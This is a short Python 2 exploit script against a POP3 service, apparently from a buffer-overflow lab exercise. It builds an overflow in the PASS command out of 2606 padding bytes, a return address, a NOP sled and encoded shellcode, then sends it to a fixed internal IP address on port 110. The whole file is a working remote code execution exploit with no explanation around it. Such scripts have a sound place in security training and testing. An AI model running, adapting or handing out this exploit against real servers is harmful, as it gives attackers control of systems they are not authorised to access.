#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
shellcode=(
"\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xcf\x28\xb8"+
"\x33\x83\xeb\xfc\xe2\xf4\x33\x42\x53\x7e\x27\xd1\x47\xcc\x30\x48"+
"\x33\x5f\xeb\x0c\x33\x76\xf3\xa3\xc4\x36\xb7\x29\x57\xb8\x80\x30"+
"\x33\x6c\xef\x29\x53\x7a\x44\x1c\x33\x32\x21\x19\x78\xaa\x63\xac"+
"\x78\x47\xc8\xe9\x72\x3e\xce\xea\x53\xc7\xf4\x7c\x9c\x1b\xba\xcd"+
"\x33\x6c\xeb\x29\x53\x55\x44\x24\xf3\xb8\x90\x34\xb9\xd8\xcc\x04"+
"\x33\xba\xa3\x0c\xa4\x52\x0c\x19\x63\x57\x44\x6b\x88\xb8\x8f\x24"+
"\x33\x43\xd3\x85\x33\x73\xc7\x76\xd0\xbd\x81\x26\x54\x63\x30\xfe"+
"\xde\x60\xa9\x40\x8b\x01\xa7\x5f\xcb\x01\x90\x7c\x47\xe3\xa7\xe3"+
"\x55\xcf\xf4\x78\x47\xe5\x90\xa1\x5d\x55\x4e\xc5\xb0\x31\x9a\x42"+
"\xba\xcc\x1f\x40\x61\x3a\x3a\x85\xef\xcc\x19\x7b\xeb\x60\x9c\x6b"+
"\xeb\x70\x9c\xd7\x68\x5b\x0f\x80\xb9\x9a\xa9\x40\xb9\x88\xa9\x7b"+
"\x31\xd2\x5a\x40\x54\xca\x65\x48\xef\xcc\x19\x42\xa8\x62\x9a\xd7"+
"\x68\x55\xa5\x4c\xde\x5b\xac\x45\xd2\x63\x96\x01\x74\xba\x28\x42"+
"\xfc\xba\x2d\x19\x78\xc0\x65\xbd\x31\xce\x31\x6a\x95\xcd\x8d\x04"+
"\x35\x49\xf7\x83\x13\x98\xa7\x5a\x46\x80\xd9\xd7\xcd\x1b\x30\xfe"+
"\xe3\x64\x9d\x79\xe9\x62\xa5\x29\xe9\x62\x9a\x79\x47\xe3\xa7\x85"+
"\x61\x36\x01\x7b\x47\xe5\xa5\xd7\x47\x04\x30\xf8\xd0\xd4\xb6\xee"+
"\xc1\xcc\xba\x2c\x47\xe5\x30\x5f\x44\xcc\x1f\x40\x48\xb9\xcb\x77"
)
buffer='A'*2606+'\x8f\x35\x4a\x5f'+'\x90'*8+shellcode
try:
	print "Sending evil buffer"
	connection=s.connect(('192.168.1.145',110))
	s.recv(1024)
	s.send('USER test\r\n')
	s.recv(1024)
	s.send('PASS '+buffer+'\r\n')
	print "Done"
        #s.send('QUIT\r\n')
	#s.close()
except:
	print "Could not connect to POP3"

